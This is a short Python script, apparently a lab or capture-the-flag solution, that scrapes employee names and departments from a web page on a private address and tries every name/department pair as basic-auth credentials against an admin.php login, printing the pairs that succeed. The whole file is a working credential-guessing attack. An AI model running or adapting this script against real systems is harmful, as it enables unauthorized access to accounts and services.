import requests
from bs4 import BeautifulSoup


def getContent(tag_list):
    li = []
    for element in tag_list:
        element = element.get_text()
        li.append(element)
    return li


r = requests.get('http://172.16.120.120')
html_doc = r.text
soup = BeautifulSoup(html_doc, 'html.parser')
names = soup.find_all(id="name")
names = getContent(names)
uniqnames = sorted(set(names))
departments = soup.find_all(id="department")
departments = getContent(departments)
uniqdepartments = sorted(set(departments))
for name in uniqnames:
    for department in uniqdepartments:
        a = requests.get('http://172.16.120.120/admin.php', auth=(name, department))
        if a.status_code == requests.codes.ok:
            print("Find username '{}' and password '{}' login in successfully.".format(name, department))